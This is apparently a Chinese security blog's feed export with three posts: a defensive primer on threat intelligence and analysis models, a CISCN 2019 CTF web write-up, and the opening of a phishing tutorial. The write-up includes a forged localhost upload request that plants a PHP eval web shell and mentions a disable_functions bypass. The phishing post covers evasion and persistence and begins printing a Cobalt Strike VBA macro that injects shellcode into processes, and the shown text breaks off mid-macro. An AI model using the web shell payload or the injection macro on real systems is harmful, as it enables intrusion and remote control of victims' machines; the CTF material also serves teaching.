href="https://www.slideshare.net/JeremyLi10/discover-advanced-threats-with-threat-intelligence-jeremy-li" target="_blank" rel="noopener">https://www.slideshare.net/JeremyLi10/discover-advanced-threats-with-threat-intelligence-jeremy-li</a></p><p>传统分类来看，威胁情报分为：</p><ol><li>战术情报</li><li>战略情报</li><li>运营情报</li></ol><p><strong>战术级情报</strong>：战术情报的作用主要是发现威胁事件以及对报警确认或优先级排序。常见的失陷检测情报（CnC 情报，即攻击者控制被害主机所使用的远程命令与控制服务器情报）、IP情报就属于这个范畴，它们都是可机读的情报，可以直接被设备使用，自动化的完成上述的安全工作。</p><p><strong>运营级情报</strong>：运营级情报是给安全分析师或者说安全事件响应人员使用的，目的是对已知的重要安全事件做分析（报警确认、攻击影响范围、攻击链以及攻击目的、技战术方法等）或者利用已知的攻击者技战术手法主动的查找攻击相关线索。</p><p><strong>战略级情报</strong>：战略层面的威胁情报是给组织的安全管理者使用的，比如CSO。它能够帮助决策者把握当前的安全态势，在安全决策上更加有理有据。包括了什么样的组织会进行攻击，攻击可能造成的危害有哪些，攻击者的战术能力和掌控的资源情况等，当然也会包括具体的攻击实例。</p><p>—————————-手动分割线——————————–</p><p>然后<code>@e1knot</code>师傅在知乎专栏中提到了另一种分类方式，在我看来这种也是更加容易理解的（赞）</p><p>👉 <a href="https://zhuanlan.zhihu.com/p/30105006" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30105006</a></p><p>大概就是分为如下几种类型：</p><ol><li>IP/Domain 信誉类情报</li><li>网络通信流量数据</li><li>事件分类（Incident Pulse）数据</li><li>蜜罐数据</li><li>被动流量解析（Passive DNS）数据</li></ol><p>（相信各位渗透测试工作者也常常在实战中遇到蜜罐这类东西，稍不注意就会把自己常用的姿势和手段“送”给企业）</p><p><strong>IP/Domain 信誉类情报</strong>：经常逛微步社区或者用它来找过dns解析之类的师傅肯定也会发现，IP或者域名会被打上各种标签，例如：<br><img src="/初识威胁情报.resources/D934469E-34B5-428B-9F83-FB61673159EA.png" alt="34f6416ad8558f4cf07372f9484726b6"></p><p>以下平台可以供我们方便的查询到这个IP/Domaini是不是已经被列为恶意IP/Domain，或者他在某一段时间是否是被恶意攻击者攻陷等。</p><ul><li>微步在线 - <a href="https://x.threatbook.cn" target="_blank" rel="noopener">https://x.threatbook.cn</a></li><li>奇安信威胁情报中心 - <a href="https://ti.qianxin.com/" target="_blank" rel="noopener">https://ti.qianxin.com/</a></li><li>RiskIQ Community - <a href="https://community.riskiq.com" target="_blank" rel="noopener">https://community.riskiq.com</a></li></ul><p>但是由于不同的威胁平台的检测可能不同，导致结果可能有偏差等。所以相对其他的，反而成为了相对最没有价值的情报</p><p><strong>网络通信流量数据</strong>：这里指从大网上采集的数据，也就是我们俗称的外网数据。主要是看目标服务器的流量波动，比如如果在某一个端口上的流量在一段时间剧增，可能存在被入侵的风险</p><p><strong>事件分类</strong>：这里提一下两个概念：</p><ol><li>CERT：Computer emergency response team  维基百科：<a href="https://en.wikipedia.org/wiki/Computer_emergency_response_team" target="_blank" rel="noopener">wiki</a></li><li>CIRT：Critical Incident Response Team 维基百科：<a href="https://en.wikipedia.org/wiki/Critical_Incident_Response_Team" target="_blank" rel="noopener">wiki</a></li></ol><p>具体可以查看后面的维基百科链接进行了解<br>然后是事件分类大概就是，将威胁情报的基础数据进行打包分类，然后封装成一个个的事件。<br>这种情报的好处在哪里呢，一个是可以基本全面的进行威胁分析，然后提前预警。然后同时也可以更快的发现事件。<br>然后厂商经过整理后，可以通过订阅的方式进行预警，同时收取订阅费用。<br>例如：</p><ul><li>微步在线</li><li>Alienvault OTX <a href="https://otx.alienvault.com" target="_blank" rel="noopener">https://otx.alienvault.com</a></li><li>IBM X-Force Exchange <a href="https://exchange.xforce.ibmcloud.com/" target="_blank" rel="noopener">https://exchange.xforce.ibmcloud.com/</a></li></ul><p><strong>蜜罐数据</strong>：这个东西没什么好说的，就是企业部署在内网或者外网（很少）的一些看似薄弱点，引诱攻击者进行攻击，暴露自己的行为特征甚至是TTP</p><p>然后最近冰总社区里发了个挺好玩的开源蜜罐：<br>👉 <a href="https://bithack.io/forum/484" target="_blank" rel="noopener">https://bithack.io/forum/484</a></p><p><strong>被动流量解析</strong>：其实就是被动DNS（Passive DNS），也是一种比较老的技术了，但是依然很常用，特别是溯源内网恶意流量的时候..下面这几篇文章讲的很详细了～就不多讲了</p><ul><li><a href="https://securityintelligence.com/how-to-use-passive-dns-to-inform-your-incident-response/" target="_blank" rel="noopener">How to Use Passive DNS to Inform Your Incident Response</a></li><li><p><a href="https://www.deteque.com/news/passive-dns/" target="_blank" rel="noopener">What is Passive DNS? A beginner’s guide</a></p></li><li><p><a href="https://www.riskiq.com/platform/architecture/internet-data-sets/passive-dns/" target="_blank" rel="noopener">Passive DNS</a></p></li></ul><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><blockquote><p>《Market Guide for Security Threat Intelligence Service》 – Gartner . 2014</p></blockquote><p>在业界接受较广，而他认为情报是过程的产物，而非独立数据点的合集。Gartner刻画了威胁情报的生命周期：<br><img src="/初识威胁情报.resources/A574A6F6-0408-4F70-90D0-5E43D1CA3147.png" alt="b551bc79146cfd117fd9ccf5b4c04408.png"></p><ul><li>定向：定义目标并完善</li><li>收集：从多种开放或封闭的源收集数据；电子的、人工的</li><li>处理：如有需要，翻译；进行可靠性评估；核对多个源</li><li>分析：判断此信息的意义；评估信息的重要性；推荐相应措施</li><li>传递：将情报传递给客户</li><li>反馈：依照需求调整</li></ul><h3 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h3><p>同样也是<code>@e1knot</code>师傅文章中提到的，<strong>威胁情报在安全运营体系中的定位是——辅助发现潜在的或正在发起的恶意行为或操作，重点在于辅助两个字，威胁情报严格意义上来说只能有限的感知潜在的威胁，换句话说：如果有人现在瞄准的目标全部都是能源类客户，那么威胁情报就可以提醒没有被攻击的客户可能会遭受到该攻击者的攻击，这个叫做有限的感知潜在的威胁。</strong></p><h2 id="0x02-分析模型"><a href="#0x02-分析模型" class="headerlink" title="0x02 分析模型"></a>0x02 分析模型</h2><p><a href="https://www.slideshare.net/JeremyLi10/application-of-threat-intelligence-in-security-operation?utm_source=slideview&amp;utm_medium=ssemail&amp;utm_campaign=first_clip" target="_blank" rel="noopener">https://www.slideshare.net/JeremyLi10/application-of-threat-intelligence-in-security-operation?utm_source=slideview&amp;utm_medium=ssemail&amp;utm_campaign=first_clip</a></p><p>既然威胁情报是个辅助手段，所以，我们通过使用威胁情报进行分析，才是最主要的。<br>这里目前用的比较多的就是两大模型：</p><ol><li>Kill Chain</li><li>Diamond Model</li></ol><p>但是我觉得现在应该再加一个ATT&amp;CK矩阵，比如以最出名的<code>MITRE ATT&amp;CK</code>举例，里面基本上集合了绝大部分的入侵模型。<br>👉 <a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&amp;CK</a></p><h3 id="Kill-Chain模型"><a href="#Kill-Chain模型" class="headerlink" title="Kill-Chain模型"></a>Kill-Chain模型</h3><p><img src="/初识威胁情报.resources/0133F529-3989-4E8B-847C-F5A3F33C1FBE.jpg" alt="fcc8b4c5429f36b191520f4c40e4dcb1.jpeg"><br>这个模型其实和<code>PTES</code>比较相似，做渗透比较多的同学应该都比较了解了</p><ul><li>侦查阶段：扫描目标IT资产和信息收集，比如说Google Hacking这些侦查类型的攻击</li><li>武器化阶段：将前一阶段发现和扫描到漏洞的信息整合到一起并制作针对性的武器（当然国内的嘛，你懂得）</li><li>部署阶段：将这些武器或者是远控RAT部署到对应的Compromised Servers上</li><li>攻击阶段：使用这些Compromised Servers和之前做好的武器化工具对目标发起攻击</li><li>后门种植阶段：安装远程控制的服务和进程</li><li>远控阶段：让目标和C&amp;C通信</li><li>后渗透阶段：收割、继续横向渗透入侵</li></ul><p>还是给一个链接：<a href="http://www.pentest-standard.org/index.php/Main_Page" target="_blank" rel="noopener">pentest-standard</a><br>PTES基本流程：</p><ul><li>Pre-engagement Interactions</li><li>Intelligence Gathering</li><li>Threat Modeling</li><li>Vulnerability Analysis</li><li>Exploitation</li><li>Post Exploitation</li><li>Reporting</li></ul><p><strong><code>Kill-Chain模型</code>基本上就是描述了攻击者的进攻路线，但是并不能明确的说明造成的影响和目的。</strong></p><h3 id="Diamond-Model模型"><a href="#Diamond-Model模型" class="headerlink" title="Diamond Model模型"></a>Diamond Model模型</h3><p>钻石模型是一个针对单个事件分析的模型，核心就是用来描述攻击者的技战术和目的，具体的钻石模型如下图所示：<br><img src="/初识威胁情报.resources/11AEE56D-E38D-48D7-B02D-D09B38AEE471.jpg" alt="4b601b6bc348f226a906ce13b3d535d0.jpeg"></p><p>钻石模型由三部分组成：置信度、元数据、社会-政治影响和技战术组合</p><p><strong>社会政治影响</strong>：处于钻石模型上下两个顶点，上顶点表示攻击者，下顶点表示受害者也就是目标。攻击者和受害者之间的某种利益冲突或者是社会地位对立则会产生攻击的意图和发起攻击的原因，纵切面表示的就是社会政治影响。说大白话就是根据这俩人去发现攻击的意图。</p><p><strong>技战术组合</strong>：技战术组合位于整个钻石模型的横切面，横切面的两个顶点分别为基础设施和技术能力，这里的基础设施和技术能力其实都是相对于攻击者而言的。</p><p><strong>元数据</strong>：这个其实就是左边列出来的，攻击时间、攻击阶段、攻击结果、攻击方向、攻击手段、攻击资源利用。</p><p><strong>置信度</strong>：也就是以上你分析出结果的可信程度。</p><p>钻石模型想要表达的其实就是针对单个安全事件，我们可以得到攻击者为什么想要攻击目标，打算用什么手段去攻击目标。</p><h3 id="Kill-Chain-Diamond-Model"><a href="#Kill-Chain-Diamond-Model" class="headerlink" title="Kill-Chain + Diamond Model"></a>Kill-Chain + Diamond Model</h3><p>直接举个例子<code>@e1knot</code>师傅给的例子：</p><p>复杂的攻击往往都是有一系列的攻击事件组成的，不同的攻击事件指向的目标和达到的目的可以表示出攻击的进程，那么OK，我们如果把事件按照Kill-Chain进行分类同时使用泳道图进行表示，同时把不同的攻击路线分为不同的攻击线程，那么我们就可以得到一个这样的泳道图。<br><img src="/初识威胁情报.resources/84FF0AAE-65B8-43D4-8BB2-F5E6A1E8A614.jpg" alt="b9baf610a02307c8c0c3d905bc9b497c.jpeg"><br>其实这张图描述的是这么一个事件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.攻击者先对目标进行了Google Hacking操作，获得了他们域名解析记录等一些基础的It信息</span><br><span class="line">2.攻击者找到了一个目标新注册的域名，然后用搜索引擎搜索他们的网络管理员的电子邮件信息</span><br><span class="line">3.攻击者使用鱼叉邮件方式对目标的网络管理员发送一封带有木马的邮件</span><br><span class="line">4.目标的网管（我们叫他网管一号）打开了这封邮件的附件然后不幸中枪</span><br><span class="line">5.网管一号的主机因为中了病毒，所以攻击者利用网管一号这台主机发送了一个HTTP Post请求到域控节点，然后域控节点返回了一个HTTP Response</span><br><span class="line">6.我们通过对鱼叉邮件中附件进行逆向分析发现里面有两个IP地址，第二个IP地址作为备份，防止第一个失效</span><br><span class="line">7.通过C&amp;C请求到网管一号的主机，我们的恶意程序打开了一个TCP代理服务</span><br><span class="line">8.通过网管一号主机上的代理服务，攻击者继续去Google上搜索其他的目标</span><br><span class="line">9.攻击者检查网管一号邮件的通信录列表去寻找是否拥有目标二号的通讯方式，结果发现了目标二号的首席科学家的联系方式</span><br><span class="line">10.攻击者使用攻陷的网管一号的邮箱对目标二号的首席科学家的邮箱发起鱼叉邮件攻击，工具使用和之前一样的</span><br><span class="line">11.此时又来了一个攻击者，我们称他为攻击者二号，攻击者一号扫描了目标三号的web服务器</span><br><span class="line">12.使用同样的漏洞利用工具攻击发现目标三号主机上的相同的漏洞</span><br><span class="line">13.被攻陷的目标三号主机返回一个shell会话给攻击者三号</span><br><span class="line">14.目标三号的所有数据被攻击者三号窃取</span><br></pre></td></tr></table></figure></p><p>这样的话使用Kill-Chain和钻石模型分析可以同时get到攻击者的点和想要攻击的目标，同时还知道了他的攻击路径，也就是说这时候我们对攻击者了如指掌了。</p><h3 id="ATT-amp-CK-Matrix-for-Enterprise"><a href="#ATT-amp-CK-Matrix-for-Enterprise" class="headerlink" title="ATT&amp;CK Matrix for Enterprise"></a>ATT&amp;CK Matrix for Enterprise</h3><p>这个是我自己加上去的，同时也是平时去了解红队TTP的好地方<br><img src="/初识威胁情报.resources/1223BE32-9B48-4504-8164-6F1625D130B3.png" alt="2425d00398a387cd6532219f91303fa9"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>学习上面的知识也有一点自己的想法，威胁情报作为态势感知的一种，不仅能够让企业针对性的进行防御，同时也能够让运营看到自己的一些盲点，能够跟好的进行企业安全建设相关的方面（说到这里也不得不赞叹谷歌的0信任，真的太牛逼了)，威胁情报能做的事情还是很多的，我自己整理之后觉得有以下几个方向：</p><pre><code>1. 企业安全建设相关2. 学习运营盲点3. 溯源攻击4. 全球共享情报，增加入侵成本5. 学习新的攻击手段，收集0day（蜜罐）6. ……</code></pre><p>最后，e1knot师傅tql</p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484237&amp;idx=1&amp;sn=a02b4576bac88de4089a259d3da3ccb9&amp;chksm=ec6fe44ddb186d5b57eb61af95a7edbf24d4012fa640a9382e2e99f236f0215f2b3953658297&amp;scene=38#wechat_redirect" target="_blank" rel="noopener">使用威胁情报调查攻击者</a></p><p><a href="https://zhuanlan.zhihu.com/p/30160133" target="_blank" rel="noopener">使用威胁情报追踪攻击者——Part 2 高级威胁事件分析与防御矩阵</a></p><p><a href="https://www.xmanblog.net/threat-intelligence/" target="_blank" rel="noopener">浅析威胁情报</a><br><a href="https://xz.aliyun.com/t/1814" target="_blank" rel="noopener">浅谈高级威胁情报对于安全建设的意义与思考（上）—攻击者情报那些不得不说的事儿</a><br><a href="https://xz.aliyun.com/t/1928" target="_blank" rel="noopener">浅谈高级威胁情报对于安全建设的意义与思考（中）—基础设施情报那些不得不说的事儿</a><br><a href="https://xz.aliyun.com/t/1935" target="_blank" rel="noopener">浅谈高级威胁情报对于安全建设的意义与思考（下）—事件情报那些不得不说的事儿</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-14 23:32:22&lt;br&gt;&lt;img src=&quot;/wallpaper/[30679]SCENT-65089776.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="威胁情报" scheme="http://patrilic.top/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 Final Web11 赛后复盘</title>
    <link href="http://patrilic.top/2019/07/28/CISCN%202019%20Final%20Web11/"/>
    <id>http://patrilic.top/2019/07/28/CISCN 2019 Final Web11/</id>
    <published>2019-07-28T07:08:02.000Z</published>
    <updated>2019-07-28T06:45:17.697Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>比赛的时候熬了一万年，只看到了一个本地请求，都不知道这个ssrf怎么利用，哎，还是要好好学逆向(吐血)</p><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>题目链接：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a> (推一手北联合师傅的平台)<br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><p>上传文件显示只能localhost上传，并且使用$SERVER[‘Remote-addr’]来获取ip<br>感觉只能采用ssrf之类的方式去上传文件，但是一直没get到点</p><p><a href="http://web65.buuoj.cn/index.php?act=post&amp;md=readme.md" target="_blank" rel="noopener">http://web65.buuoj.cn/index.php?act=post&amp;md=readme.md</a><br>md参数存在任意文件读取，可以利用php伪协议读源码<br><img src="/CISCN 2019 Final Web11.resources/D3CBF586-E936-4124-93C5-A89366265174.png" alt="7d9e6b80be391556be25e272dcb649f8"></p><p>然而并没有什么用，比赛的时候就一直卡在这里。<br>一直在想怎么去绕过，然后比赛给了提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. SSRF</span><br><span class="line">2. .htaccess</span><br></pre></td></tr></table></figure></p><p>.htaccess可以看到他让.md格式解析成了php<br><img src="/CISCN 2019 Final Web11.resources/7D9338F3-6F65-468B-9691-352B58498516.png" alt="25da9c8a3e1d8a088353b5d55747884a"></p><p>但是ssrf又怎么去看呢，源码里肯定没有，问题应该出在.so文件里<br>post.php里调用了 <strong>pmark_include()</strong> 函数<br><img src="/CISCN 2019 Final Web11.resources/58BBF5BD-2025-44D1-971A-B1F7AFADA63E.png" alt="7f5b593808f423764660307f15744e2a"></p><p>而在readme.md里是能把so文件下下来的<br>打开IDA分析一波</p><p>sub_1850里存在一个Http包，会以127.0.0.1的身份去request<br><img src="/CISCN 2019 Final Web11.resources/3472965F-EB2A-4FBC-9ACF-6D3D2D6DFB49.png" alt="0bb9f4775d2531e018e23f72e2803950"></p><p>往上找调用<br><img src="/CISCN 2019 Final Web11.resources/96DC7631-995E-46AB-B7FF-157D53503E90.png" alt="53e4cf1d179c5eb62ff8d33bc810f35d"><br><img src="/CISCN 2019 Final Web11.resources/3A9A08B0-404E-4783-BE8A-AFF0428FB826.png" alt="361977c811b801c48c5a73dd4e2c51a8"><br><img src="/CISCN 2019 Final Web11.resources/7774A215-1CC3-4998-AAA6-552A05DD86E4.png" alt="33f0b7885e41503a3a65a1ec8ddb08f2"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int zend_hash_find ( HashTable* ht, char* arKey, uint nKeyLength, void** pData )</span><br></pre></td></tr></table></figure></p><p>v15: debug</p><p>参数为debug,利用ssrf上传即可</p><p>所以可以直接构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Referer: http://127.0.0.1:8080/index.php?act=upload</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797</span><br><span class="line">Content-Length: 244</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------6693638881479522630623693797</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">eval($_REQUEST[a]);</span><br><span class="line"></span><br><span class="line">-----------------------------6693638881479522630623693797--</span><br></pre></td></tr></table></figure></p><p>利用popen()绕过disabled_function<br><img src="/CISCN 2019 Final Web11.resources/94B8FADA-439F-4570-AFFB-44DF3A46FF86.png" alt="6107013d4772477cccc8e3fa7092f23b"></p><p><img src="/CISCN 2019 Final Web11.resources/F8097A0E-B573-4829-845E-0430F080DEB4.png" alt="ae389cb740da2a425e80d4d3a9b8d851"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;比赛的时候熬了一万年，只看到了一个本地请求，都不知道这个ssrf怎么利用，哎，还是要好好学逆向(吐血)&lt;/p&gt;
&lt;h2 id=&quot;题目信息&quot;&gt;&lt;a href=&quot;#题目信息&quot; class=&quot;headerlink&quot; title=&quot;题目信息&quot;&gt;&lt;/a&gt;题目
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Phishing Attack - 文件落地</title>
    <link href="http://patrilic.top/2019/07/18/Phishing%20Attack%20-%20%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0/"/>
    <id>http://patrilic.top/2019/07/18/Phishing Attack - 文件落地/</id>
    <published>2019-07-18T03:20:33.000Z</published>
    <updated>2019-08-16T05:12:14.683Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-07-18 11:20:33<br><img src="/wallpaper/[39567]Good Morning-54191467.png" alt><br>[toc]<br>鱼叉攻击，作为一种常见的攻击形式，中心思想就是将shellcode以各种形式进行伪装，然后诱使受害者启动程序，利用C2服务器进行远程命令执行</p></blockquote><p>鱼叉攻击的难点：</p><ol><li>信任伪造 – 常见的有swaks伪造邮件，DNS劫持，改写被信任网站等</li><li>免杀 – 能规避市面上大多数杀毒软件，不被发现</li><li>维持进程 – 长期控制，，开机自启</li><li>不暴露 – 不落地，依附进程，certutil等</li></ol><p>本文意在总结一些较为常见的利用方式，不是很注重文笔，看看就好，一些脚本是直接copy大手子<code>@3gstudent</code>师傅的，然后关于类似与<code>CobaltStrike</code>的Spear phish以及Nginx的玩法，单独进行总结</p><h2 id="0x00-Office"><a href="#0x00-Office" class="headerlink" title="0x00 Office"></a>0x00 Office</h2><h3 id="Office-Macro"><a href="#Office-Macro" class="headerlink" title="Office Macro"></a>Office Macro</h3><p>Office文档内置宏，可利用VB远程命令执行回弹到C2服务器<br>👇由CobaltStrike生成的Macro病毒样本<br><img src="/Phishing Attack - 文件落地.resources/6A9FD69F-ED50-4060-93AA-726501F481E2.png" alt="0ea9ced974025abd297e31f79a2624bb"></p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> Type PROCESS_INFORMATION</span><br><span class="line">    hProcess <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hThread <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwProcessId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwThreadId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type STARTUPINFO</span><br><span class="line">    cb <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    lpReserved <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    lpDesktop <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    lpTitle <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    dwX <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwY <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFillAttribute <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFlags <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    wShowWindow <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    cbReserved2 <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    lpReserved2 <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdInput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdOutput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdError <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> LongPtr, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> LongPtr, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> LongPtr) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span 